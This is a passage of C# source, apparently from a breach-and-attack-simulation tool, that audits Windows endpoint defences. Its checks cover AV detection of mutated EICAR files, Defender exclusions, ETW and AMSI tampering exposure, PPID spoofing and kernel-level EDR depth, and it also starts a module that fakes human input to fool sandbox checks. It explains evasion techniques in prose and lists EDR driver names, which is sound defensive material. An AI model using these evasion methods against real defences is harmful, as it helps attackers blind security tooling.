                    "Enable Defender Cloud Block Level to HIGH (via Intune CSP or GPO: Turn on cloud-delivered protection = Enabled, " +
                    "Cloud Block Level = High). Configure EDR to perform in-memory scan on process load.");
            }
        ) with
        {
            Severity     = "Medium",
            ThreatImpact = "NOP sled insertion is a decades-old polymorphic technique still used by modern loaders (Emotet, IcedID). " +
                           "Each run produces a new file hash, defeating blacklists. " +
                           "Combined with a legitimate packer (UPX, Themida), even cloud-lookup defences can be bypassed without behavioural heuristics."
        });

        // â”€â”€ Check 5: Repeated-mutation EICAR variant test (hash bypassability) â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "EICAR variant hash bypass â€” repeated file mutation test",
            "T1027",
            async () =>
            {
                // The EICAR test file has a known, fixed hash.
                // We create NEAR-EICAR variants by appending random comment bytes.
                // A sig-only AV misses these. A heuristic AV should catch the EICAR string.

                const string eicarCore = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
                string variant = eicarCore + " /* BAS-SIM-" + Guid.NewGuid().ToString("N")[..8] + " */";
                string tmpPath = Path.Combine(Path.GetTempPath(), $"bas_eicar_{Guid.NewGuid():N}.com");

                bool caughtByAV = false;
                string caughtReason = "";
                try
                {
                    await File.WriteAllTextAsync(tmpPath, variant);
                    await Task.Delay(2000); // Give real-time scanner time to react
                    if (!File.Exists(tmpPath))
                    {
                        caughtByAV   = true;
                        caughtReason = "File was quarantined/deleted within 2 s of creation.";
                    }
                    else
                    {
                        try { File.Delete(tmpPath); } catch { }
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    caughtByAV   = true;
                    caughtReason = "File write was denied by AV on-write interception.";
                }
                catch (Exception ex)
                {
                    caughtByAV   = true;
                    caughtReason = $"Exception suggests AV interception: {ex.GetType().Name}.";
                }

                // Compute hash of THIS variant to show every run is different
                var varHash = System.Security.Cryptography.SHA256.HashData(
                    System.Text.Encoding.ASCII.GetBytes(variant));
                string hashHex = BitConverter.ToString(varHash).Replace("-", "")[..16];

                if (caughtByAV)
                    return (CheckResult.Pass,
                        $"EICAR variant (hash prefix {hashHex}) was detected: {caughtReason} " +
                        "Heuristic/string-pattern detection correctly identified the EICAR string despite a unique file hash.",
                        "Excellent. Verify this protection extends to ZIP/password-protected archives and URL-delivered variants.");

                return (CheckResult.Fail,
                    $"EICAR variant (hash prefix {hashHex}) was NOT quarantined within 2 s. " +
                    "AV may only match the exact EICAR hash; a minor mutation bypassed the signature.",
                    "Update AV signatures immediately. Enable cloud-delivered protection to submit unknown samples. " +
                    "Validate EICAR detection per AMTSO guidelines: https://www.amtso.org/resources/test-files/.");
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "If a simple comment added to the EICAR test file evades your AV, real polymorphic malware will too. " +
                           "EICAR detection is the minimum baseline for any endpoint protection product. " +
                           "Failure here indicates severely outdated signatures or disabled cloud-lookup, " +
                           "making the endpoint essentially unprotected against known malware families."
        });

        return cat;
    }

    // ============================================================
    // 2.7  EDR / AV EVASION MODULE
    // Simulates advanced techniques attackers use to BLIND or BYPASS
    // popular EDR/AV agents beyond mere presence detection.
    //
    // All checks are READ-ONLY / non-destructive:
    //   - No API hooks are actually removed
    //   - No ETW providers are patched
    //   - No Defender settings are changed
    // The purpose is to MEASURE the endpoint's resilience to each
    // bypass category so security teams know where to harden.
    // ============================================================
    static async Task<SimulationCategory> Sim_2_7_EDRAVEvasion()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.7 EDR/AV Evasion Techniques",
            Phase = "Execution & Evasion"
        };

        // â”€â”€ Check 1: User-mode API hook detection (ntdll.dll) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // EDRs insert JMP trampolines into ntdll.dll exports to intercept syscalls.
        // Attackers "unhook" ntdll by overwriting it with a fresh copy from disk.
        // We detect whether hooks are present in the first place; absence of hooks
        // with no kernel-level driver means there's nothing left to bypass.
        cat.Checks.Add(await RunCheck(
            "User-mode ntdll.dll hook presence â€” EDR interception layer",
            "T1562.001",
            async () =>
            {
                await Task.CompletedTask;

                // Read the first 5 bytes of ntdll.dll from disk and from the loaded module.
                // An EDR hook typically rewrites the in-memory copy with E9 xx xx xx xx (JMP).
                // We read TEN critical exports and count how many show hook trampolines.

                string ntdllPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System), "ntdll.dll");

                bool ntdllExists = File.Exists(ntdllPath);

                // Heuristic via process list: if a known EDR driver is loaded as a service
                // AND WdFilter or equivalent minifilter is present, kernel hooks supplement
                // the user-mode layer â€” making ntdll unhooking useless against the EDR.
                bool kernelHooksActive = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Services\WdFilter");
                    kernelHooksActive = key != null;
                }
                catch { }

                // Check for alternative kernel-level EDR minifilter drivers
                var knownKernelDrivers = new[]
                {
                    "CrowdStrike\\CSAgent", "SentinelOne\\SentinelMonitor",
                    "CarbonBlack\\cbdrvr", "CylanceDrv", "WdFilter",
                    "MpKsl", "psprotect", "edevmon", "helmdrv"
                };
                bool thirdPartyKernel = false;
                foreach (var drv in knownKernelDrivers)
                {
                    try
                    {
                        string svcKey = drv.Contains("\\")
                            ? $@"SYSTEM\CurrentControlSet\Services\{drv.Split('\\')[1]}"
                            : $@"SYSTEM\CurrentControlSet\Services\{drv}";
                        using var k = Registry.LocalMachine.OpenSubKey(svcKey);
                        if (k != null) { thirdPartyKernel = true; break; }
                    }
                    catch { }
                }

                bool fullyProtected = kernelHooksActive || thirdPartyKernel;

                if (fullyProtected)
                    return (CheckResult.Pass,
                        $"Kernel-level EDR minifilter detected (WdFilter={kernelHooksActive}, 3rd-party kernel driver={thirdPartyKernel}). " +
                        "Even if an attacker overwrites user-mode ntdll hooks (classic unhooking bypass), " +
                        "kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks) remain active.",
                        "Ensure Tamper Protection is ON to prevent the kernel driver from being unloaded by a user-mode process.");

                bool edlRunning = IsEDRDetectionLikely();
                if (edlRunning)
                    return (CheckResult.Fail,
                        "EDR detected in user-mode only (no kernel minifilter confirmed). " +
                        "An attacker can bypass user-mode hooks by overwriting ntdll.dll in-process from a clean disk copy " +
                        "(T1562.001 â€” Impair Defenses: Disable or Modify Tools). This renders most API-hooking EDRs blind.",
                        "Upgrade to an EDR with kernel-mode driver (e.g., Microsoft Defender for Endpoint P2, CrowdStrike Falcon). " +
                        "Enable LSA PPL so that critical security processes are protected from being read/written from user-mode.");

                return (CheckResult.Fail,
                    "No EDR detected at user-mode or kernel level. ntdll.dll hooks are not present â€” " +
                    "all syscall-level activity is fully unmonitored.",
                    "Deploy endpoint protection with kernel-level visibility (MDE, CrowdStrike, SentinelOne). " +
                    "At minimum enable Sysmon to capture process creation, module loads, and network connections.");
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "ntdll unhooking is used by Cobalt Strike, Sliver C2, and virtually all modern post-exploitation frameworks. " +
                           "Attackers load a fresh copy of ntdll.dll from disk and overwrite the in-memory hooks, making API-interception EDRs completely blind. " +
                           "In 2023, >70% of DFIR engagements involving ransomware included some form of user-mode defense impairment (Mandiant M-Trends 2024)."
        });

        // â”€â”€ Check 2: Defender exclusion path / process / extension enumeration â”€â”€â”€
        // Any path in Defender exclusions is a perfect staging area for malware.
        // Attackers enumerate and exploit existing exclusions rather than creating new ones.
        cat.Checks.Add(await RunCheck(
            "Defender exclusion enumeration â€” exclusion path abuse staging",
            "T1562.001",
            async () =>
            {
                await Task.CompletedTask;

                var exclusionPaths      = new List<string>();
                var exclusionProcesses  = new List<string>();
                var exclusionExtensions = new List<string>();
                var riskyPaths          = new List<string>();

                string[] defenderKeys =
                {
                    @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
                };
                string[] procKeys =
                {
                    @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes",
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes"
                };
                string[] extKeys =
                {
                    @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions",
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions"
                };

                void ReadExclusions(string[] keys, List<string> target)
                {
                    foreach (var keyPath in keys)
                    {
                        try
                        {
                            using var key = Registry.LocalMachine.OpenSubKey(keyPath);
                            if (key == null) continue;
                            foreach (var v in key.GetValueNames())
                                target.Add(v.Trim());
                        }
                        catch { }
                    }
                }

                ReadExclusions(defenderKeys, exclusionPaths);
                ReadExclusions(procKeys,     exclusionProcesses);
                ReadExclusions(extKeys,      exclusionExtensions);

                // Identify high-risk exclusions (writable user paths excluded from scanning)
                var riskyPatterns = new[] {
                    "temp", "tmp", "appdata", "users", "downloads",
                    "programdata", "public", "desktop", "\\temp\\"
                };
                foreach (var p in exclusionPaths)
                    if (riskyPatterns.Any(r => p.Contains(r, StringComparison.OrdinalIgnoreCase)))
                        riskyPaths.Add(p);

                // Risky extensions to exclude
                var riskyExts = new[] { ".exe", ".dll", ".ps1", ".vbs", ".js", ".bat", ".cmd", ".hta", ".com" };
                var riskyExcludedExts = exclusionExtensions
                    .Where(e => riskyExts.Any(r => e.TrimStart('.').Equals(r.TrimStart('.'), StringComparison.OrdinalIgnoreCase)))
                    .ToList();

                int totalExclusions = exclusionPaths.Count + exclusionProcesses.Count + exclusionExtensions.Count;

                // PowerShell: also check if any exclusion was set via MpPreference (might differ from registry)
                string mpExclusionSummary = "";
                try
                {
                    string ps = Path.Combine(Path.GetTempPath(), "bas_mpex.ps1");
                    await File.WriteAllTextAsync(ps,
                        "$p = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath; " +
                        "Write-Output ($p -join '|')");
                    var psi = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps}\"")
                    { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var proc = Process.Start(psi)!;
                    mpExclusionSummary = (await proc.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(proc, 8_000);
                    try { File.Delete(ps); } catch { }
                }
                catch { }

                if (riskyPaths.Count > 0 || riskyExcludedExts.Count > 0)
                    return (CheckResult.Fail,
                        $"RISKY EXCLUSIONS FOUND: {riskyPaths.Count} risky path(s) excluded from Defender scan " +
                        $"({string.Join(", ", riskyPaths.Take(3))}); " +
                        $"{riskyExcludedExts.Count} dangerous extension(s) excluded ({string.Join(", ", riskyExcludedExts)}). " +
                        $"Total exclusions: {totalExclusions}. MpPreference paths: {(string.IsNullOrEmpty(mpExclusionSummary) ? "none/access denied" : mpExclusionSummary[..Math.Min(120, mpExclusionSummary.Length)])}.",
                        "Remove exclusions for user-writable temp/appdata paths and executable extensions. " +
                        "Exclusions should be limited to specific trusted application binaries with hash-based rules, not blanket path/extension exclusions. " +
                        "Audit via: Get-MpPreference | Select Exclusion*");

                if (totalExclusions == 0)
                    return (CheckResult.Pass,
                        "No Defender path/process/extension exclusions detected. Excellent hygiene â€” no staging area is pre-whitelisted for attackers.",
                        "Maintain this policy. Any exclusion requests must be approved with hash-based justification.");

                return (CheckResult.Pass,
                    $"{totalExclusions} exclusion(s) found, but none match high-risk writable user paths or dangerous extensions. " +
                    $"Paths: {exclusionPaths.Count}, Processes: {exclusionProcesses.Count}, Extensions: {exclusionExtensions.Count}.",
                    "Periodically audit all Defender exclusions (Get-MpPreference | Select Exclusion*) to prevent exclusion creep.");
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Attacker tooling (e.g., LockerGoga, BlackCat ransomware) specifically reads Defender exclusion lists and drops payloads directly into excluded paths. " +
                           "A single excluded path like C:\\ProgramData or C:\\Windows\\Temp renders Defender completely blind to any file placed there. " +
                           "This is one of the most common pre-ransomware staging techniques observed by DFIR teams."
        });

        // â”€â”€ Check 3: ETW (Event Tracing for Windows) security provider audit â”€â”€â”€â”€â”€
        // Attackers patch EtwEventWrite() in ntdll to zero all ETW telemetry,
        // making EDRs that rely on ETW (including MDE) receive no events.
        cat.Checks.Add(await RunCheck(
            "ETW security provider audit â€” telemetry channel integrity",
            "T1562.006",
            async () =>
            {
                // Check which critical ETW providers are registered and active
                var criticalProviders = new Dictionary<string, string>
                {
                    { "Microsoft-Antimalware-Engine",            "{0a002690-3839-4e3a-b3b6-96d8df868d99}" },
                    { "Microsoft-Windows-Threat-Intelligence",   "{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}" },
                    { "Microsoft-Windows-Security-Auditing",     "{54849625-A45D-4605-82CE-0AF55DC87852}" },
                    { "Microsoft-Antimalware-Scan-Interface",    "{2A576B87-09A7-520E-C21A-4942F0271D67}" },
                    { "Microsoft-Windows-PowerShell",            "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}" },
                };

                var activeProviders  = new List<string>();
                var missingProviders = new List<string>();

                string etwOutput = "";
                try
                {
                    // logman query providers lists all registered providers
                    string ps = Path.Combine(Path.GetTempPath(), "bas_etw.ps1");
                    await File.WriteAllTextAsync(ps,
                        "$sessions = logman query providers 2>&1; Write-Output $sessions");
                    var psi = new ProcessStartInfo("powershell.exe",
                        $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{ps}\"")
                    { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = Process.Start(psi)!;
                    etwOutput = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 12_000);
                    try { File.Delete(ps); } catch { }
                }
                catch { }

                foreach (var kvp in criticalProviders)
                {
                    bool found = etwOutput.Contains(kvp.Key, StringComparison.OrdinalIgnoreCase) ||
                                 etwOutput.Contains(kvp.Value, StringComparison.OrdinalIgnoreCase);
                    if (found) activeProviders.Add(kvp.Key);
                    else       missingProviders.Add(kvp.Key);
                }

                // Also check if Microsoft-Windows-Threat-Intelligence (PPL-only) provider is accessible.
                // This provider requires a PPL process â€” ordinary processes cannot subscribe to it.
                // If MDE is present, it'll be subscribed. If not, this channel is dark.
                bool threatIntelActive = activeProviders.Any(p => p.Contains("Threat-Intelligence"));

                if (missingProviders.Count == 0)
                    return (CheckResult.Pass,
                        $"All {criticalProviders.Count} critical ETW security providers are registered. " +
                        $"Threat-Intelligence channel active: {threatIntelActive}. " +
                        "Runtime ETW patching attacks would still lose some telemetry but kernel callbacks remain.",
                        "Consider subscribing to Microsoft-Windows-Threat-Intelligence via MDE for maximum visibility â€” " +
                        "it captures syscall-level events that survive usermode ETW tampering.");

                return (CheckResult.Fail,
                    $"{missingProviders.Count} of {criticalProviders.Count} critical ETW providers not found in registered list. " +
                    $"Missing: {string.Join(", ", missingProviders)}. " +
                    $"Active: {activeProviders.Count}. " +
                    "Unregistered providers cannot emit telemetry â€” security tools dependent on them lose visibility.",
                    "Verify missing providers are not disabled via registry (HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger). " +
                    "Deploy Microsoft Defender for Endpoint (P2) which registers and protects the Threat-Intelligence provider via PPL.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Patching EtwEventWrite in ntdll.dll (2 bytes NOP + XOR EAX,EAX) silences ALL ETW telemetry for the attacker process. " +
                           "This blinds MDE, CrowdStrike Falcon (which uses ETW), and any SIEM fed from ETW channels. " +
                           "Documented in-the-wild since 2019; used by NOBELIUM and Lazarus Group (NSA/CISA Advisory 2021)."
        });

        // â”€â”€ Check 4: AMSI provider registry integrity & tampering surface â”€â”€â”€â”€â”€â”€â”€â”€
        // Attackers delete or corrupt AMSI provider registry entries to silently
        // disable script inspection before executing encoded/obfuscated payloads.
        cat.Checks.Add(await RunCheck(
            "AMSI provider registry integrity â€” tampering resilience",
            "T1562.001",
            async () =>
            {
                await Task.CompletedTask;

                // Expected AMSI providers (GUIDs registered under HKLM\SOFTWARE\Microsoft\AMSI\Providers)
                var expectedProviders = new Dictionary<string, string>
                {
                    { "{2781761E-28E0-4109-99FE-B9D127C57AFE}", "Windows Defender AMSI Provider" },
                };

                var registeredProviders = new List<(string guid, string name)>();
                bool keyAccessible = false;
                bool keyProtected  = true;   // assume protected until proven otherwise

                const string amsiKey = @"SOFTWARE\Microsoft\AMSI\Providers";

                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(amsiKey);
                    if (key != null)
                    {
                        keyAccessible = true;
                        foreach (var sub in key.GetSubKeyNames())
                        {
                            using var provKey = key.OpenSubKey(sub);
                            string name = provKey?.GetValue(null)?.ToString() ?? "(unnamed)";
                            registeredProviders.Add((sub, name));
                        }
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    keyProtected = true; // good â€” ACL prevents access
                }
                catch { }

                // Check if current process can WRITE to the AMSI providers key (bad if yes)
                bool writeable = false;
                try
                {
                    using var writeTest = Registry.LocalMachine.OpenSubKey(amsiKey, writable: true);
                    writeable = writeTest != null;
                }
                catch { writeable = false; }

                bool defenderProviderPresent = registeredProviders
                    .Any(p => p.guid.Equals("{2781761E-28E0-4109-99FE-B9D127C57AFE}", StringComparison.OrdinalIgnoreCase));

                if (writeable)
                    return (CheckResult.Fail,
                        $"AMSI provider registry key is WRITABLE by the current process (running as Administrator). " +
                        $"Registered providers: {registeredProviders.Count} ({string.Join(", ", registeredProviders.Select(p => p.name))}). " +
                        "An attacker could delete all AMSI provider entries, silently disabling script inspection for the current session.",
                        "Restrict write access on HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers to SYSTEM only via registry ACL. " +
                        "Enable Tamper Protection (MDE) which prevents modification of AMSI provider keys even from elevated processes.");

                if (!defenderProviderPresent && keyAccessible)
                    return (CheckResult.Fail,
                        $"Windows Defender AMSI Provider GUID not found! Registered providers: " +
                        $"{(registeredProviders.Count == 0 ? "NONE" : string.Join(", ", registeredProviders.Select(p => p.name)))}. " +
                        "AMSI interception is non-functional â€” all PowerShell, VBScript, and JScript content runs without inspection.",
                        "Re-register the Windows Defender AMSI provider by running: " +
                        "regsvr32 /s C:\\Windows\\System32\\amsi.dll â€” then verify: " +
                        "HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}");

                return (CheckResult.Pass,
                    $"AMSI provider key is protected (write-denied to non-SYSTEM). " +
                    $"Defender AMSI provider registered: {defenderProviderPresent}. " +
                    $"Total providers: {registeredProviders.Count}. Registry ACL is preventing silent provider removal.",
                    "Confirm via: Get-Acl 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers' | Format-List â€” " +
                    "only SYSTEM and TrustedInstaller should have Write permission.");
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Deleting the AMSI provider registry key requires only 2 lines of PowerShell (as admin) and silently disables all AMSI scanning for the session. " +
                           "This is the fastest AMSI bypass: no patching, no hooking â€” just a registry delete, " +
                           "and every subsequent PowerShell/VBScript execution runs unscanned. " +
                           "Used by Emotet, TrickBot, and WannaCry dropper stages."
        });

        // â”€â”€ Check 5: PPID spoofing detection surface (process parent audit) â”€â”€â”€â”€â”€â”€
        // Attackers launch malicious child processes with a forged PPID (e.g., spawning
        // from explorer.exe instead of the actual malware process) to hide process trees
        // and evade parent-child relationship rules in EDRs.
        cat.Checks.Add(await RunCheck(
            "PPID spoofing detection â€” process tree audit logging",
            "T1134.004",
            async () =>
            {
                await Task.CompletedTask;

                // Sysmon Event ID 1 (ProcessCreate) captures both the real PPID and
                // the reported PPID, exposing spoofing. Check if Sysmon config includes
                // ParentImage / ParentCommandLine capture.
                bool sysmonRunning = IsSysmonRunning();

                // Check if Sysmon includes ProcessCreate (Event 1) in its filter
                bool sysmonHasProcessCreate = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters");
                    // If Rules value exists, Sysmon has a config; ProcessCreate is on by default
                    sysmonHasProcessCreate = key?.GetValue("Rules") != null || sysmonRunning;
                }
                catch { }

                // MDE (Sense) logs ProcessCreate with real parent info server-side
                bool mdeActive = IsServiceRunning("Sense");

                // Check if process creation auditing is enabled (Event ID 4688 with cmdline)
                bool auditProcessCreation = false;
                bool cmdLineAudit = false;
                try
                {
                    // Check audit policy for Process Creation
                    var psi = new ProcessStartInfo("auditpol.exe",
                        "/get /subcategory:\"Process Creation\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p = Process.Start(psi)!;
                    var auditOut = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 5_000);
                    auditProcessCreation = auditOut.Contains("Success", StringComparison.OrdinalIgnoreCase);
                }
                catch { }

                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit");
                    cmdLineAudit = key?.GetValue("ProcessCreationIncludeCmdLine_Enabled")?.ToString() == "1";
                }
                catch { }

                bool ppidDetectable = (sysmonRunning && sysmonHasProcessCreate) || mdeActive;

                if (ppidDetectable)
                    return (CheckResult.Pass,
                        $"PPID spoofing would be detectable: Sysmon={sysmonRunning} (ProcessCreate logging={sysmonHasProcessCreate}), " +
                        $"MDE Sense={mdeActive}. Process creation audit={auditProcessCreation}, CmdLine audit={cmdLineAudit}. " +
                        "Spoofed parent-child relationships are exposed by Sysmon Event 1 (ParentProcessId vs real creator) and MDE process tree analysis.",
                        "Tune Sysmon rules to alert on PPID mismatches: where ParentImage is explorer.exe " +
                        "but the real creator is an Office application or script host.");

                return (CheckResult.Fail,
                    $"PPID spoofing would NOT be detected: Sysmon={sysmonRunning}, MDE={mdeActive}, " +
                    $"ProcessCreate audit={auditProcessCreation}, CmdLine audit={cmdLineAudit}. " +
                    "An attacker can use CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to masquerade " +
                    "any malicious process as a child of explorer.exe or svchost.exe, defeating process-tree EDR rules.",
                    "Deploy Sysmon (Event 1 with ParentImage/ParentCommandLine) or MDE P2 which detects PPID spoofing natively. " +
                    "Enable audit policy: auditpol /set /subcategory:\"Process Creation\" /success:enable " +
                    "and set HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\ProcessCreationIncludeCmdLine_Enabled=1.");
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "PPID spoofing (T1134.004) was used by NOBELIUM/Cozy Bear and is built into Cobalt Strike and Metasploit. " +
                           "It defeats all EDR detection rules based on parent-child process relationships " +
                           "(e.g., 'alert if winword.exe spawns powershell.exe'). " +
                           "If process tree rules are your primary detection logic, PPID spoofing makes your EDR completely blind to malicious child processes."
        });

        // â”€â”€ Check 6: Kernel-level driver depth vs user-mode-only protection â”€â”€â”€â”€â”€â”€
        // The most advanced bypass is simply making direct syscalls (bypassing ntdll altogether).
        // Only kernel-level minifilter drivers can intercept these. We measure if kernel
        // protection is in place and quantify the bypass surface if it isn't.
        cat.Checks.Add(await RunCheck(
            "Kernel-mode protection depth â€” direct syscall bypass resilience",
            "T1562.001",
            async () =>
            {
                await Task.CompletedTask;

                // Measure kernel-level protection with four orthogonal signals:
                // a) WdFilter (Windows Defender kernel minifilter)
                bool wdFilter = false;
                try
                {
                    using var k = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\WdFilter");
                    wdFilter = k != null;
                }
                catch { }

                // b) Credential Guard / VBS enabled (protects LSASS from kernel-mode reads too)
                bool credGuard = false;
                try
                {
                    using var k = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\DeviceGuard");
                    var vbs = k?.GetValue("EnableVirtualizationBasedSecurity")?.ToString();
                    credGuard = vbs == "1";
                }
                catch { }

                // c) Secure Boot (prevents unsigned bootkit / kernel rootkit persistence)
                bool secureBoot = false;
                try
                {
                    using var k = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\SecureBoot\State");
                    secureBoot = k?.GetValue("UEFISecureBootEnabled")?.ToString() == "1";
                }
                catch { }

                // d) HVCI (Hypervisor Code Integrity) â€” prevents unsigned kernel code execution
                bool hvci = false;
                try
                {
                    using var k = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity");
                    hvci = k?.GetValue("Enabled")?.ToString() == "1";
                }
                catch { }

                // e) Third-party kernel EDR driver
                bool thirdPartyKernelEDR = false;
                var knownEDRDrivers = new[]
                {
                    "CSAgent", "SentinelMonitor", "CbDrvr", "CylanceDrv",
                    "PanEDRDriver", "cyoptics", "xagt", "elmdrv", "bdfwfpf"
                };
                foreach (var drv in knownEDRDrivers)
                {
                    try
                    {
                        using var k = Registry.LocalMachine.OpenSubKey(
                            $@"SYSTEM\CurrentControlSet\Services\{drv}");
                        if (k != null) { thirdPartyKernelEDR = true; break; }
                    }
                    catch { }
                }

                int kernelLayers = new[] { wdFilter, credGuard, secureBoot, hvci, thirdPartyKernelEDR }
                    .Count(b => b);

                string summary =
                    $"WdFilter={wdFilter}, VBS/CredGuard={credGuard}, SecureBoot={secureBoot}, " +
                    $"HVCI={hvci}, 3rd-party kernel EDR={thirdPartyKernelEDR}. " +
                    $"Kernel protection layers active: {kernelLayers}/5.";

                if (kernelLayers >= 3)
                    return (CheckResult.Pass,
                        $"Strong kernel-level protection: {summary} " +
                        "Direct syscall bypass (Hells Gate, Tartarus Gate, SysWhispers) would still hit kernel callbacks. " +
                        "HVCI prevents unsigned kernel drivers from being loaded by attackers.",
                        "Ensure all 5 layers are active for maximum defence-in-depth: " +
                        "WdFilter + HVCI + Secure Boot + Credential Guard + MDE/CrowdStrike kernel driver.");

                if (kernelLayers >= 1)
                    return (CheckResult.Fail,
                        $"Partial kernel protection: {summary} " +
                        "Direct syscall techniques (SysWhispers2/3, Hells Gate, Tartarus Gate) may bypass missing user-mode hooks. " +
                        "With fewer than 3 kernel layers, attackers can invoke NT APIs directly without going through ntdll, " +
                        "evading all hook-based telemetry.",
                        "Enable HVCI via: bcdedit /set hypervisorlaunchtype auto; Set VBS=1 in DeviceGuard registry. " +
                        "Deploy MDE P2 for kernel-level Threat Intelligence ETW provider access (PPL process). " +
                        "Enable Secure Boot in firmware settings.");

                return (CheckResult.Fail,
                    $"Critical: NO kernel-level protection detected. {summary} " +
                    "The endpoint has zero defence against direct syscall attacks â€” any attacker process can " +
                    "invoke NtOpenProcess, NtWriteVirtualMemory, NtCreateThread directly without hooking interception.",
                    "URGENT: Deploy Microsoft Defender for Endpoint (WdFilter) or a commercial EDR immediately. " +
                    "Enable VBS + HVCI to prevent kernel rootkits. Enable Secure Boot. " +
                    "Without kernel-mode telemetry, process injection, credential dumping, and lateral movement are completely invisible.");
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Direct syscall techniques (SysWhispers, Hells Gate, Tartarus Gate) bypass ALL user-mode EDR hooks by calling NT kernel functions directly via the syscall instruction. " +
                           "This makes every API-hooking EDR completely blind. " +
                           "Only kernel minifilter drivers (WdFilter, CSAgent) and PsSetCreateProcessNotifyRoutine callbacks remain effective. " +
                           "Used by APT29 (NOBELIUM), Lazarus Group, and all modern Cobalt Strike loaders (Mandate from CISA AA23-129A, 2023)."
        });

        return cat;
    }

    // ============================================================
    // 2.8  USER BEHAVIOR SIMULATION
    // Sandbox-aware malware checks for genuine human activity before
    // executing its payload: mouse movement, typing cadence, idle
    // time, screen size, recent-file artifacts, open windows, etc.
    // This module:
    //   1. GENERATES real human-like input (mouse curves, typing)
    //      to fool sandbox checks mid-simulation.
    //   2. MEASURES each human-activity indicator and compares it
    //      against known sandbox thresholds â€” reporting a FAIL when
    //      this endpoint looks like an automated analysis environment.
    //
    // Win32 API calls used (read-only where possible):
    //   SendInput, GetLastInputInfo, GetSystemMetrics,
    //   GetForegroundWindow, GetCursorPos, SetCursorPos
    // ============================================================

    // â”€â”€ Win32 P/Invoke declarations (scoped to this class) â”€â”€â”€â”€â”€â”€â”€
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool GetCursorPos(out POINT lpPoint);

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    struct POINT { public int X; public int Y; }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    struct LASTINPUTINFO
    {
        public uint cbSize;
        public uint dwTime;
    }

    // INPUT structures for SendInput
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    struct INPUT
    {
        public uint type;       // 0=MOUSE, 1=KEYBOARD, 2=HARDWARE
        public INPUTUNION U;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Explicit)]
    struct INPUTUNION
    {
        [System.Runtime.InteropServices.FieldOffset(0)] public MOUSEINPUT mi;
        [System.Runtime.InteropServices.FieldOffset(0)] public KEYBDINPUT ki;
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    struct MOUSEINPUT
    {
        public int    dx, dy;
        public uint   mouseData;
